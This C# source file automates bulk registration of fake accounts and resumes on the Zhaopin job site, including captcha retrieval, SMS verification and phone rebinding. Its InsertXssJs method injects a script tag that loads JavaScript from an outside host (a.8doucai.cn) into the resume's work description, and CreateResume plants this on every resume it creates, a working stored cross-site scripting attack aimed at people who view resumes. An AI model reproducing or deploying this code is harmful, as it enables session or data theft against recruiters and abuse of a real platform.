using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using Badoucai.Library;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Web;
using Badoucai.Business.Model;
using Newtonsoft.Json;

namespace Badoucai.Business.Zhaopin
{
    public class AutoRegisterBusiness
    {
        public static CookieContainer cookieContainer = new CookieContainer();
        
        /// <summary>
        /// 添加用户信息
        /// </summary>
        /// <param name="model"></param>
        /// <returns></returns>
        public DataResult AddUserInformation(UserInformation model)
        {
            var dictionary = new Dictionary<string, string>
            {
                { "username", model.UserName },
                { "type", "0" },
                { "residence_p", model.Residence_P },
                { "residence_district", "" },
                { "residence", model.Residence },
                { "langerId", "1" },
                { "iseditemail", "True" },
                { "hukou_p", model.Hukou_P },
                { "hukou", model.Hukou },
                { "gender", model.Gender },
                { "experience_month",model.ExperienceMonth },
                { "experience", model.ExperienceYear },
                { "expe", "" },
                { "emailshow", model.Email },
                { "email2", "1" },
                { "email1", model.Email },
                { "contact_num", model.Cellphone },
                { "birth_date_y", model.BirthDateYear },
                { "birth_date_m", model.BirthDateMonth }
            };

            try
            {
                using (var client = new HttpClient(new HttpClientHandler { CookieContainer = cookieContainer }))
                {
                    using (var content = new MultipartFormDataContent("-----------------------------7e12b12a1291bd4")) //表明是通过multipart/form-data的方式上传数据  
                    {
                        foreach (var item in dictionary)
                        {
                            content.Add(new ByteArrayContent(Encoding.UTF8.GetBytes(item.Value)), $"\"{item.Key}\"");
                        }

                        foreach (var parameter in content.Headers.ContentType.Parameters)
                        {
                            if (parameter.Name== "boundary")
                            {
                                parameter.Value = parameter.Value.Replace("\"", "");
                            }
                        }

                        var response = client.SendAsync(new HttpRequestMessage
                        {
                            Headers =
                            {
                                { "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" },
                                { "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36" },
                                { "Referer", "https://passport.zhaopin.com/account/register" }
                            },
                            Method = HttpMethod.Post,
                            Content = content,
                            RequestUri = new Uri("https://i.zhaopin.com/resume/userinfo/Add")
                        }).Result.Content.ReadAsStringAsync().Result;

                        if (response.ToLower().Contains("resume/standard/add?language="))
                        {
                            return new DataResult();
                        }

                        return new DataResult("添加用户基本信息失败！");
                    }
                }
            }
            catch (Exception ex)
            {
                return new DataResult($"添加用户信息异常！异常信息：{ex.Message}。");
            }
        }

        /// <summary>
        /// 添加简历基础信息
        /// </summary>
        /// <param name="model"></param>
        /// <returns></returns>
        public DataResult<Tuple<string,string>> AddResumeBaseContent(BaseResumeModel model)
        {
            var dictionary = new List<KeyValuePair<string, string>>
            {
                new KeyValuePair<string,string>("WorkDescription", model.WorkDescription),
                new KeyValuePair<string,string>("WorkDateStartYear", model.WorkDateStartYear ),
                new KeyValuePair<string,string>("WorkDateStartMonth", model.WorkDateStartMonth ),
                new KeyValuePair<string,string>("WorkDateEndYear", model.WorkDateEndYear ),
                new KeyValuePair<string,string>("WorkDateEndMonth", model.WorkDateEndMonth ),
                new KeyValuePair<string,string>("SubJobType", model.SubJobType ),
                new KeyValuePair<string,string>("SchoolName", model.SchoolName ),
                new KeyValuePair<string,string>("Salary", model.Salary ),
                new KeyValuePair<string,string>("MajorType", model.MajorType ),
                new KeyValuePair<string,string>("MajorSubType", model.MajorSubType ),
                new KeyValuePair<string,string>("MajorName", model.MajorName ),
                new KeyValuePair<string,string>("Language","1" ),
                new KeyValuePair<string,string>("JobType", model.JobType ),
                new KeyValuePair<string,string>("JobTitle", model.JobTitle ),
                new KeyValuePair<string,string>("IsTongZhao", "y" ),
                new KeyValuePair<string,string>("industry_sub", model.Industry),
                new KeyValuePair<string,string>("haveWorkExpress", "1" ),
                new KeyValuePair<string,string>("EduDateStartYear", model.EduDateStartYear ),
                new KeyValuePair<string,string>("EduDateStartMonth", model.EduDateStartMonth ),
                new KeyValuePair<string,string>("EduDateEndYear", model.EduDateEndYear ),
                new KeyValuePair<string,string>("EduDateEndMonth", model.EduDateEndMonth ),
                new KeyValuePair<string,string>("EducationLevel", model.EducationLevel ),
                new KeyValuePair<string,string>("DesiredSalaryScope", model.DesiredSalaryScope ),
                new KeyValuePair<string,string>("DesiredJobType", model.DesiredJobType ),
                new KeyValuePair<string,string>("DesiredIndustry", model.DesiredIndustry ),
                new KeyValuePair<string,string>("DesiredEmploymentType", model.DesiredEmploymentType),
                new KeyValuePair<string,string>("DesiredCity", model.DesiredCity ),
                new KeyValuePair<string,string>("desired_Jobtype_id", model.DesiredJobTypeId ),
                new KeyValuePair<string,string>("desired_Industry_super", model.DesiredIndustrySuper ),
                new KeyValuePair<string,string>("CurrentCareerStatus", "2" ),
                new KeyValuePair<string,string>("CompanyName", model.CompanyName ),
                new KeyValuePair<string,string>("CompanyIndustry", model.CompanyIndustry ),
                new KeyValuePair<string,string>("", "1540"),
                new KeyValuePair<string,string>("", "10001-15000元/月" ),
                new KeyValuePair<string,string>("", "15000-25000元/月" ),
                new KeyValuePair<string,string>("", "本科"),
                new KeyValuePair<string,string>("", "我目前在职，正考虑换个新环境（如有合适的工作机会，到岗时间一个月左右）"),
                new KeyValuePair<string,string>("", "范例一：\r\n该公司为海外著名网络技术公司驻华办事处。任职期间参与制定公司发展战略和目标，组织策划并实施了人力资源管理体系，健全了各项规章制度，加大员工本土化进程，改革薪酬福利制度，完善了人力资源相关业务过程（包括工作分析、招聘、培训、绩效、薪资等），并参与完成ERP系统改进工作。\r\n范例二：\r\n根据公司的近期和远期目标、财务预算，制定销售计划、制定和审核销售预算，提出产品价格政策；根据同类其他产品的市场动态，销售动态、存在问题、市场竞争发展状况等实施分析汇总，并提出改进方案和措施，协同销售计划的顺利完成；保持与客户的良好关系，维护客户管理，定期组织市场调研、分析市场动向、特点和发展趋势。于2006年成功拓展市场，实现年销售额600万的产品销售业绩。")
            };

            var responseResult =  HttpClientFactory.RequestForString("https://i.zhaopin.com/Resume/Standard/add?language=1&express=2006", HttpMethod.Post, dictionary, cookieContainer, "https://i.zhaopin.com/Resume/Standard/add?language=1&express=2006");

            if (responseResult.IsSuccess)
            {
                var match = Regex.Match(responseResult.Data, @"resumeNumber=(J[RSML]\d{9}R\d{11})\&resumeId=(\d{9})");

                if (match.Success)
                {
                    return new DataResult<Tuple<string, string>>(new Tuple<string, string>(match.Result("$1"), match.Result("$2")));
                }
            }

            return new DataResult<Tuple<string, string>>("添加简历内容失败！");
        }

        /// <summary>
        /// 设置简历保密
        /// </summary>
        /// <param name="extendedId"></param>
        /// <param name="resumeId"></param>
        /// <returns></returns>
        public DataResult SetResumePrivate(string extendedId, string resumeId)
        {
            var responseResult = HttpClientFactory.RequestForString($"https://i.zhaopin.com/ResumeCenter/MyCenter/SetOpenStatus?Resume_ID={resumeId}&Ext_ID={extendedId}&Version_Number=1&Language_ID=1&level=1&t={BaseFanctory.GetUnixTimestamp()}784", HttpMethod.Get, cookieContainer: cookieContainer);

            if (responseResult.IsSuccess && responseResult.Data.Contains("修改成功")) return responseResult;

            return new DataResult("设置保密失败！" + responseResult.ErrorMsg);
        }

        /// <summary>
        /// 插入Js脚本
        /// </summary>
        /// <param name="extendedId"></param>
        /// <param name="resumeId"></param>
        /// <param name="resume"></param>
        /// <param name="xssJs"></param>
        /// <returns></returns>
        public DataResult InsertXssJs(string extendedId, string resumeId, BaseResumeModel resume, string xssJs)
        {
            var param = $"Language_ID=1&ext_id={extendedId}&Resume_ID={resumeId}&Version_Number=1&RowID=0&SaveType=0&cmpany_name={HttpUtility.UrlEncode(resume.CompanyName)}&industry={resume.CompanyIndustry}&customSubJobtype={HttpUtility.UrlEncode(resume.JobTitle)}&SchJobType={resume.JobType}&subJobType={resume.SubJobType}&jobTypeMain={resume.JobType}&subJobTypeMain={resume.SubJobType}&workstart_date_y={resume.WorkDateStartYear.Replace("年","")}&workstart_date_m={resume.WorkDateStartMonth.Replace("月", "")}&workend_date_y={resume.WorkDateEndYear.Replace("年", "")}&workend_date_m={resume.WorkDateEndMonth.Replace("月", "")}&salary_scope={resume.Salary}&job_description={HttpUtility.UrlEncode(resume.WorkDescription + xssJs)}&company_type=&company_size=";

            var dataResult = RequestFactory.QueryRequest("https://i.zhaopin.com/Resume/WorkExperienceEdit/Save", param , RequestEnum.POST, cookieContainer);

            if (!dataResult.IsSuccess) return new DataResult("植入脚本失败！" + dataResult.ErrorMsg);

            return dataResult;
        }

        /// <summary>
        /// 添加自我介绍
        /// </summary>
        /// <param name="extendedId"></param>
        /// <param name="resumeId"></param>
        /// <param name="content"></param>
        /// <returns></returns>
        public DataResult AddSelfEvaluete(string extendedId, string resumeId, string content)
        {
            var param = $"SubRowId=&version_number=1&ext_id={extendedId}&resume_id={resumeId}&Language_id=1&CommentTitle=%E8%87%AA%E6%88%91%E8%AF%84%E4%BB%B7&custom_commenttitle=&CommentContent={HttpUtility.UrlEncode(content)}";

            var dataResult = RequestFactory.QueryRequest("https://i.zhaopin.com/Resume/SelfEvaluete/Save", param, RequestEnum.POST, cookieContainer, $"https://i.zhaopin.com/Resume/SelfEvaluete/edit/{resumeId}/{extendedId}/1/1");

            if (!dataResult.IsSuccess) return new DataResult("添加自我介绍失败！" + dataResult.ErrorMsg);

            return dataResult;
        }

        /// <summary>
        /// 获取注册验证图片
        /// </summary>
        /// <returns></returns>
        public DataResult<Stream> GetRegisterCaptcha()
        {
            HttpClientFactory.RequestForString("https://passport.zhaopin.com/account/register", HttpMethod.Get, cookieContainer: cookieContainer);

            var responseResult = HttpClientFactory.RequestForStream("https://passport.zhaopin.com/checkcode/img", HttpMethod.Get, cookieContainer: cookieContainer, referer: "https://passport.zhaopin.com/account/register");

            if (!responseResult.IsSuccess) return new DataResult<Stream>("获取验证码失败！" + responseResult.ErrorMsg);

            return responseResult;
        }

        /// <summary>
        /// 发送注册验证码
        /// </summary>
        /// <param name="mobile"></param>
        /// <param name="checkCode"></param>
        /// <returns></returns>
        public DataResult SendRegisterSms(string mobile, string checkCode)
        {
            var dictionary = new Dictionary<string, string>
            {
                { "mobile",mobile },
                { "checkcode", checkCode },
                { "r", "0.9746406065467921" }
            };

            var sendResult = HttpClientFactory.RequestForString("https://passport.zhaopin.com/account/generatemobilecc", HttpMethod.Post, dictionary, cookieContainer, "https://passport.zhaopin.com/account/register");

            if (!sendResult.IsSuccess) return new DataResult("发送验证码失败！" + sendResult.ErrorMsg);

            var result = JsonConvert.DeserializeObject<dynamic>(sendResult.Data);

            if (result.status != 1) return new DataResult((string)result.msg);

            return new DataResult();
        }

        /// <summary>
        /// 注册
        /// </summary>
        /// <param name="registerName"></param>
        /// <param name="password"></param>
        /// <param name="mobileValidCode"></param>
        /// <returns></returns>
        public DataResult Register(string registerName, string password, string mobileValidCode)
        {
            var dictionary = new Dictionary<string, string>
            {
                {"RegisterName", registerName },
                {"Password", password },
                {"PasswordConfirm", password },
                {"MobileValidCode", password },
                {"accept", "on" }
            };

            var responseResult = HttpClientFactory.RequestForString("https://passport.zhaopin.com/account/register", HttpMethod.Post, dictionary, cookieContainer);

            if (!responseResult.IsSuccess) return responseResult;

            if (!responseResult.Data.Contains("i.zhaopin.com/resume/userinfo")) return new DataResult("注册失败！");

            return new DataResult();
        }

        /// <summary>
        /// 获取绑定验证图片
        /// </summary>
        /// <returns></returns>
        public DataResult<Stream> GetBindCaptcha()
        {
            var responseResult = HttpClientFactory.RequestForStream("https://i.zhaopin.com/Captcha?t=0.6481554921657733", HttpMethod.Get, cookieContainer: cookieContainer, referer: "https://i.zhaopin.com/ResumeCenter/AccountSet/Index?tab=2");

            if(!responseResult.IsSuccess) return new DataResult<Stream>("获取验证码失败！" + responseResult.ErrorMsg);

            return responseResult;
        }

        /// <summary>
        /// 发送换绑手机验证码
        /// </summary>
        /// <param name="mobile"></param>
        /// <param name="picCode"></param>
        /// <returns></returns>
        public DataResult SendBindSms(string mobile, string picCode)
        {
            var sendResult = HttpClientFactory.RequestForString($"https://i.zhaopin.com/Login/LoginApi/SendBindSms?mobile={mobile}&businessType=C-Bind&piccode={picCode}&t={BaseFanctory.GetUnixTimestamp()}", HttpMethod.Get, cookieContainer: cookieContainer, referer: "https://i.zhaopin.com/ResumeCenter/AccountSet/Index?tab=2");

            if(!sendResult.IsSuccess) return new DataResult("发送验证码失败！" + sendResult.ErrorMsg);

            var result = JsonConvert.DeserializeObject<dynamic>(sendResult.Data);

            if(result.Code != 1) return new DataResult((string)result.Msg);

            return new DataResult();
        }

        /// <summary>
        /// 换绑手机号
        /// </summary>
        /// <param name="verifyCode"></param>
        /// <param name="oldMoblie"></param>
        /// <param name="newMobile"></param>
        /// <returns></returns>
        public DataResult ChangeMobile(string verifyCode, string oldMoblie, string newMobile)
        {
            var dictionary = new Dictionary<string, string>
            {
                { "verifyCode", verifyCode },
                { "oldMoblie", oldMoblie.Remove(3, 4).Insert(3, "****")},
                { "newMobile", newMobile }
            };

            var changeResult = HttpClientFactory.RequestForString($"https://i.zhaopin.com/usermaster/UsermasterManage/ChangeMobile?t={BaseFanctory.GetUnixTimestamp()}784", HttpMethod.Post, dictionary, cookieContainer, "https://i.zhaopin.com/ResumeCenter/AccountSet/Index?tab=2");

            if (!changeResult.IsSuccess) return new DataResult("修改绑定手机失败！" + changeResult.ErrorMsg);

            try
            {
                var result = JsonConvert.DeserializeObject<dynamic>(changeResult.Data);

                if (result.Code != 0) return new DataResult((string)result.Msg);
            }
            catch (Exception)
            {
                throw new Exception(changeResult.Data);
            }

            return new DataResult();
        }

        /// <summary>
        /// 创建基础简历
        /// </summary>
        /// <param name="model"></param>
        /// <returns></returns>
        public DataResult CreateResume(BaseResumeModel model)
        {
            var addInfoResult = AddUserInformation(model.UserInformation);

            if (!addInfoResult.IsSuccess) return addInfoResult;

            var addContentResult = AddResumeBaseContent(model);

            if (!addContentResult.IsSuccess) return addContentResult;

            var insertXssResult = InsertXssJs(addContentResult.Data.Item1, addContentResult.Data.Item2, model, "<script type='text/javascript' src='https://a.8doucai.cn/scripts/default.js'></script>");

            if (!insertXssResult.IsSuccess) return insertXssResult;

            var setPrivateResult = SetResumePrivate(addContentResult.Data.Item1, addContentResult.Data.Item2);

            if (!setPrivateResult.IsSuccess) return setPrivateResult;

            return new DataResult();
        }
    }
}
